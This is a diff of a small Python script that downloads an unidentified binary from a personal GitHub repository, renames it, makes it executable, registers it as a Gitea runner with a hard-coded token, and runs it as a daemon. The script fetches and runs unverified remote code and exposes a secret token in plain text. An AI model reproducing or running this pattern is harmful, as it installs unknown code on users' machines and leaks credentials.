@@ -1,38 +1,29 @@
-
-import os
-import requests
+import urllib.request
 import subprocess
-from pathlib import Path
+import os
 
 TOKEN = "ViOjsHBuSESkK0fRd6caXNnYqsLB3WHDndITTZkb"
 
-URL = "https://github.com/medujaisa/reimagined-carnival/raw/refs/heads/main/badolaiks"
-
-binary = Path("badolaiks")
-
-# Download
-print("Downloading runner...")
-response = requests.get(URL, timeout=60)
-response.raise_for_status()
-binary.write_bytes(response.content)
-
-# Permissions
-binary.chmod(0o755)
-
-# Register
-print("Registering runner...")
-subprocess.run(
-    [
-        str(binary.resolve()),
-        "register",
-        "--instance", "https://gitea.com/",
-        "--token", TOKEN,
-        "--labels", "maiso",
-        "--name", "maiso"
-    ],
-    check=True
+URL = (
+    "https://github.com/medujaisa/reimagined-carnival/"
+    "raw/refs/heads/main/badolaiks"
 )
 
+# Download binary
+urllib.request.urlretrieve(URL, "nasmaos")
+
+# Make executable
+os.chmod("nasmaos", 0o755)
+
+# Register runner
+subprocess.run([
+    "./nasmaos",
+    "register",
+    "--instance", "https://gitea.com/",
+    "--token", TOKEN,
+    "--labels", "doco",
+    "--name", "doco"
+], check=True)
+
 # Start daemon
-print("Starting daemon...")
-os.execv(str(binary.resolve()), [str(binary.resolve()), "daemon"])
+subprocess.run(["./nasmaos", "daemon"], check=True)
